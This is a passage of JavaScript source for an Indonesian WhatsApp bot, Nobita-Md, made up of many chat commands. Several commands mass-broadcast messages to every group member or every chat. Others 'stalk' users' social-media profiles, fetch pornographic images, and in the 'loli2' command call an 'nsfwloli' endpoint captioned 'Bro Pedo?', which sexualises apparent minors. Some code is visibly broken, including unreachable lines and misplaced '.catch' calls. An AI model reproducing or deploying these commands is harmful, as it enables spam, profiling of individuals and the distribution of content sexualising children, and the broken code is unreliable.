await conn.sendMessage(from, { text: `Jika Mau Push Kontak Gunakan Command Di Bawah\n${prefix}pushkontak ${q}|Hallo Save Saleh\n\nCommand Di Atas Teks Nya Hanya Contoh Jadi Ubah Aja Yaa` }, { quoted: txrk })
}
break
        case 'pushkontakv2' : {
          if (!text) return newReply(`Example ${prefix}${command} Hi Semuanya`)
          if (!m.isGroup) return newReply(mess.group)
          if (!isCreator) return newReply(mess.owner)
          let get = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
          let count = get.length;
          let sentCount = 0;
          newReply('*_Sedang Push Kontak..._*');
          for (let i = 0; i < get.length; i++) {
            setTimeout(function() {
              conn.sendMessage(get[i], { text: text });
              count--;
              sentCount++;
              if (count === 0) {
                newReply(`*_Semua pesan telah dikirim!_*:\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
              }
            }, i * 5000); // delay setiap pengiriman selama 1 detik
          }
        }
        break;
        case 'pushmember1': {
            if (!isCreator) return newReply(mess.owner)
            if (!text) return newReply(`Menu ini hanya akan mengirim pesan ke grup.\n\nContoh: ${prefix + command} pengumuman besok libur`);
            let getGroups = await conn.groupFetchAllParticipating();
            let groups = Object.entries(getGroups)
              .slice(0)
              .map((entry) => entry[1]);
            let anu = groups.map((v) => v.id);
            newReply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`);
            for (let i of anu) {
              await sleep(delayy);
              let txt = `${text}`;
              conn.sendText(i, txt);
            }
            newReply(`Sukses Mengirim ${command} Ke ${anu.length} Group`);
          }
          break;
        conn.sendText = (jid, text, quoted = "", options) => conn.sendMessage(jid, { text: text, ...options }, { quoted });
        case 'pushmember2':
          {
              if (!XeonTheCreator) return XeonStickOwner()
            if (!text) return newReply(`Menu ini akan mengirim broadcast ke semua chat kamu termasuk ke grup juga.\n\nContoh: ${prefix + command} pengumuman besok libur`);
            let anu = await store.chats.all().map((v) => v.id);
            newReply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`);
            for (let yoi of anu) {
              await sleep(delayy);
              let txt = `${text}`;
              conn.sendText(yoi, txt);
            }
            reply("Sukses Broadcast");
          }
          break;
            
            case 'toimage': 
            case 'toimg': {
                if (!/webp/.test(mime)) return newReply(`Reply sticker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    conn.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                
            }
            break
	        case 'tomp4': 
	        case 'tovideo': {
                if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            
            case 'toaud': 
            case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            
            }
            break
            
            case 'tomp3': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By Nobita-Md.mp3`}, { quoted : m })
            
            }
            break
            
            case 'tovn': 
            case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            
            }
            break
            
            case 'togif': {
                if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            case 'telegaph': case 'tourl':
if (!isPremium) return newReply(mess.prem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media5 = await conn.downloadAndSaveMediaMessage(quoted)
const anut = await TelegraPH(media5)
conn.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg` }, caption: '${anut}'}, { quoted: m})
	.catch(console.error)
break

            // GenshinMenu
            case 'enka':
            case 'profilgi':
			if (args.length == 0) return newReply(`Example: ${prefix + command} 809005073`)
			axios.get(`https://enka.network/api/uid/${args[0]}?info`).then(({ data }) => {
				var caption = `▧「 *P R O F I L E  G E N S H I N* 」\n\n ‣ *Nickname* : *${data.playerInfo.nickname}*\n`
				caption += ` ‣ *Adventure Rank* : *${data.playerInfo.level}*\n`
				caption += ` ‣ *Signature* : *${data.playerInfo.signature}*\n`
				caption += ` ‣ *World Level* : *${data.playerInfo.worldLevel}*\n\n`
				caption += ` ‣ *Achievement* : *${data.playerInfo.finishAchievementNum}*\n`
				caption += ` ‣ *Abyss* : *Floor ${data.playerInfo.towerFloorIndex} Chamber ${data.playerInfo.towerLevelIndex}*\n\n`
				caption += `▧ *Mau Lebih Lengkap? Cek Disini :*\nhttps://enka.network/u/${args[0]}\n`
				newReply(caption)
			})
			.catch(console.error)
			break

            // Stalk Fitur
            case 'igstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} whyzzxy`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Full Name : ${data.result.fullname}\n`
				caption += `Posts : ${data.result.posts}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				conn.sendMessage(m.chat, { image: { url: data.result.photo_profile }, caption })
			})
			
			}
			break

            case 'ttstalk':
			if (args.length == 0) return newReply(`Example: ${prefix + command} dryan.pu`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Nickname : ${data.result.nickname}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Followings : ${data.result.followings}\n`
				caption += `Likes : ${data.result.likes}\n`
				caption += `Video : ${data.result.video}\n`
				caption += `Bio : ${data.result.bio}\n`
				conn.sendMessage(m.chat, { image: { url: data.result.user_picture }, caption })
			})
			.catch(console.error)
			break
			
			case 'mlstalk':
			if (args.length == 0) return newReply(`Example: ${prefix + command} 84830127/2169`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/mobilelegend/${args[0]}?apikey=${apikey}`)
			newReply(data.result)
			.catch(console.error)
			break
			
			case 'ffstalk':
			if (args.length == 0) return newReply(`Example: ${prefix + command} 52706280`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/freefire/${args[0]}?apikey=${apikey}`)
			newReply(data.result)
			.catch(console.error)
			break
			
			case 'dominostalk':
			if (args.length == 0) return newReply(`Example: ${prefix + command} 291756557`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/higghdomino/${args[0]}?apikey=${apikey}`)
			newReply(data.result)
			.catch(console.error)
			break
			
			case 'ghstalk': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} Nobita-Md`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/github/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Name : ${data.result.name}\n`
				caption += `Link : ${data.result.url}\n`
				caption += `Public Repo : ${data.result.public_repos}\n`
				caption += `Public Gists : ${data.result.public_gists}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				conn.sendMessage(m.chat, { image: { url: data.result.avatar }, caption })
			})
			
			}
			break
			
		    case 'twstalk':
			if (args.length == 0) return newReply(`Example: ${prefix + command} jokowi`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/twitter/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.screen_name}\n`
				caption += `Name : ${data.result.name}\n`
				caption += `Tweet : ${data.result.tweet}\n`
				caption += `Joined : ${data.result.joined}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Like : ${data.result.like}\n`
				caption += `Description : ${data.result.description}`
				conn.sendMessage(m.chat, { image: { url: data.result.profile_picture }, caption })
			})
			.catch(console.error)
			break
			
			case 'ssweb':
                  if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.google.com`)
                  newReply(mess.wait)
                  wm_dryan = args[0]
                  ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${apikey}&url=${wm_dryan}`)
                  conn.sendMessage(m.chat, { image: { url: ini_buffer}, caption: `Screenshot Website\n URL: ${wm_dryan}`}, {quoted: m})
            .catch(console.error)
            break
            
		    case 'darkjoke':
			newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${apikey}`}, caption: `Done?`}, {quoted: m})
            break
            
			case 'memeindo':
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${apikey}`}, caption: `Done?`}, {quoted: m})
            break
			
			// Nsfw Menu
			case 'ahegao': {
			    if (!isPremium) return newReply(mess.prem)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/ahegao?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
        }
        break
        case 'yuri': {
			if (!isPremium) return newReply(mess.prem)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random2/eroyuri?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
        }
        break
			case 'cum': {
			if (!isPremium) return newReply(mess.prem)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
        }
        break
        case 'ero': {
        	if (!isPremium) return newReply(mess.prem)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/ero?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
        }
        break
        case 'manga': {
        	if (!isPremium) return newReply(mess.prem)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/ero?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
        }
        break
			case 'milf':
			case 'feets':
			case 'armpits':
			case 'ecchi': {
			    if (!isPremium) return newReply(mess.prem)
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
		    }
	        break
	        case 'loli2': {
			    if (!isPremium) return newReply(mess.prem)
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `https://api.ibeng.tech/api/wallpaper/nsfwloli?apikey=${ibeng}`}, caption: `🤨 Bro Pedo?`})
		    }
	        break
			case 'lewd': {
			    if (!isPremium) return newReply(mess.prem)
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
		    }
	        break
			case 'tits':
			case 'cum_jpg':
			case 'lewdk': {
			    if (!isPremium) return newReply(mess.prem)
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
		    }
	        break
			
			// Ramdon Foto
	        case 'waifu':
	        case 'waifu2': {
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `https://api.ibeng.tech/api/wallpaper/${command}?apikey=${ibeng}`}, caption: `Random image for ${command}`})
		    }
	        break

	        case 'cosplay': {
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `https://api.ibeng.tech/api/random/${command}?apikey=${ibeng}`}, caption: `Random image for ${command}`})
		    }
	        break

            case 'art':
            case 'loli':
            case 'shota':
            case 'shinobu':
            case 'husbu':
            case 'wallnime': {
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`}, caption: `Random image for ${command}`})
		    }
	        break
	        
	        // Creator Image
	        case 'bucinsertifikat':
		    case 'sertifikatbucin':
			case 'bucincert':
				if (args.length == 0) return newReply(`Example: ${prefix + command} Justimun Kentod`)
				newReply(mess.wait)
				kueri = args.join(" ")
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/bucinserti?apikey=${apikey}&name=${kueri}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
            
			case 'tololsert':
			case 'tololcert':
			case 'tololsertifikat':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Justimun Kentod`)
			newReply(mess.wait)
			ytta = args.join(" ")
            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/toloserti?apikey=${apikey}&name=${ytta}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
            
			case 'pacarsertifikat':
			case 'pacarcert':
            if (args.length == 0) return newReply(`Usage: ${prefix + command} nama1|nama2`)
            newReply(mess.wait)
                get_args = args.join(" ").split("|")
                nik = get_args[0]
                prov = get_args[1]
			    titidnya = `Selamat yaa ${nik} ❤️ ${prov}`
            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pacarserti?apikey=${apikey}&name1=${nik}&name2=${prov}`}, caption: titidnya}, {quoted: m})
            break
	        
	        case 'carbon':
	            if (!q) return newReply(`Example: ${prefix + command} const adrian = required('adrian-api')`)
	            newReply(mess.wait)
	            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/carbon?apikey=${apikey}&code=${q}&language=nodejs`}, caption: `Created By Nobita-Md\n\n\nCode:\n\n${q}`}, {quoted: m})
	        break
	     
	    // Ephoto1
	    case 'wetglass':
		case 'multicolor3d':
		case 'watercolor':
		case 'luxurygold':
		case 'galaxywallpaper':
		case 'lighttext':
		case 'beautifulflower':
		case 'puppycute':
		case 'royaltext':
		case 'heartshaped':
		case 'birthdaycake':
		case 'galaxystyle':
		case 'hologram3d':
		case 'greenneon':
		case 'glossychrome':
		case 'greenbush':
		case 'metallogo':
		case 'noeltext':
		case 'glittergold':
		case 'textcake':
		case 'starsnight':
		case 'wooden3d':
		case 'textbyname':
		case 'writegalacy':
		case 'galaxybat':
		case 'snow3d':
		case 'birthdayday':
		case 'goldplaybutton':
		case 'silverplaybutton':
		case 'freefire':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Nobita-Md `)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By Nobita-Md\n\n Type: ${command}\n\nText: ${args}`})
			break

        case 'shadow':
		case 'cup':
		case 'cup1':
		case 'romance':
		case 'smoke':
		case 'burnpaper':
		case 'lovemessage':
		case 'undergrass':
		case 'love':
		case 'coffe':
		case 'woodheart':
		case 'woodenboard':
		case 'summer3d':
		case 'wolfmetal':
		case 'nature3d':
		case 'underwater':
		case 'golderrose':
		case 'summernature':
		case 'letterleaves':
		case 'glowingneon':
		case 'fallleaves':
		case 'flamming':
		case 'harrypotter':
		case 'carvedwood':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Nobita-Md`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By Nobita-Md\n\n Type: ${command}\n\nText: ${args}`})
			break

    // Text Prome
        case 'pornhub':
		case 'glitch':
		case 'avenger':
		case 'space':
		case 'ninjalogo':
		case 'marvelstudio':
		case 'lionlogo':
		case 'wolflogo':
		case 'steel3d':
		case 'wallgravity':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Nobita-Md`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 4 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${apikey}&text1=${args[0]}&text2=${args[1]}`}, caption: `Created By Nobita-Md\n\n Type: ${command}\n\nText: ${args}`})
			break

        case 'blackpink':
		case 'neon':
		case 'greenneon':
		case 'advanceglow':
		case 'futureneon':
		case 'sandwriting':
		case 'sandsummer':
		case 'sandengraved':
		case 'metaldark':
		case 'neonlight':
		case 'holographic':
		case 'text1917':
		case 'minion':
		case 'deluxesilver':
		case 'newyearcard':
		case 'bloodfrosted':
		case 'halloween':
		case 'jokerlogo':
		case 'fireworksparkle':
		case 'natureleaves':
		case 'bokeh':
		case 'toxic':
		case 'strawberry':
		case 'box3d':
		case 'roadwarning':
		case 'breakwall':
		case 'icecold':
		case 'luxury':
		case 'cloud':
		case 'summersand':
		case 'horrorblood':
		case 'thunder':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Nobita-Md`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${args}` }, caption: `Created By Nobita-Md\n\n Type: ${command}\n\nText: ${args}`})
			break
	    
	        case 'yotsuba':
            case 'shinomiya':
            case 'yumeko':
            case 'tejina':
            case 'chiho':
            case 'boruto':
            case 'kaori':
            case 'shizuka':
            case 'kaga':
            case 'gremory':
            case 'kagura':
            case 'hinata':
            case 'minato':
            case 'naruto':
            case 'sagiri':
            case 'anna':
            case 'deidara':
            case 'yuki':
            case 'asuna':
            case 'chitoge':
            case 'emilia':
            case 'inori':
            case 'madara':
            case 'sasuke':
            case 'one piece':
            case 'kotori':
            case 'mikasa':
            case 'akiyama':
            case 'shine':
            case 'shinka':
            case 'elaina':
            case 'nezuko':
            case 'rize':
            case 'anna':
            case 'ayuzawa':
            case 'hestia':
            case 'Itachi':
            case 'sakura':
            case 'tsunade':
            case 'kencki':
            case 'toukachan':
            case 'akira':
            case 'itori':
            case 'kurumi':
            case 'miku':
            case 'pokemon': {
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -3 limit
                conn.sendMessage(m.chat, { image: { url: `https://api.ibeng.tech/api/wallpaper/${command}?apikey=${ibeng}`}, caption: `Random image for ${command}`})
        }
        break
        case 'aesthetic':
            case 'anjing':
            case 'blankpink':
            case 'boneka':
            case 'darkjokes':
            case 'hekel':
            case 'justina':
            case 'kpop':
            case 'kucing':
            case 'mobil':
            case 'motor':
            case 'pubg':
            case 'rose':
            case 'ryujin':
            case 'wallhp': {
            newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Random%20Image/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
        break
			case 'cyberspace':
            case 'mountain':
            case 'programming':
            case 'technology': {
            newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Wallpaper/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
            break
            case 'cecan':
            case 'china':
            case 'cogan':
            case 'indonesia':
            case 'japan':
            case 'korea':
            case 'malaysia':
            case 'thailand':
            case 'vietnam': {
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
            break
            case 'couple': {
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let random = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, {
                    image: {
                        url: random.male
                    },
                    caption: `Couple Male`
                }, {
                    quoted: m
                })
                conn.sendMessage(m.chat, {
                    image: {
                        url: random.female
                    },
                    caption: `Couple Female`
                }, {
                    quoted: m
                })
            }
            break
            case 'wikimedia': {
                if (!text) return newReply('Mau Cari Wikimedia Apa?')
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    wikimedia
                } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done}, { quoted: m })
            }
            break
            
            case 'logo1':
            if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return newReply(`Example: ${prefix + command} Nobita-Md`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/fpslogo?apikey=${lolhuman}&text=${text}` } })
			break
			case 'logo2':
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return newReply(`Example: ${prefix + command} Nobita-Md`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/logogaming?apikey=${lolhuman}&text=${text}` } })
			break
			case 'logo3':
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return newReply(`Example: ${prefix + command} Nobita-Md`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/metallogo?apikey=${lolhuman}&text=${text}` } })
			break
			case 'logo4':
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit)
            db.data.users[m.sender].limit -= 2
            if (!text) return newReply(`Example: ${prefix + command} Nobita-Md`)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/jokerlogo?apikey=${lolhuman}&text=${args[0]}` } })
			break
            
			case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) return newReply(`Contoh : ${prefix + command} 6288292024190`)
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) return newReply(`Contoh : ${prefix + command} belanja`)
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
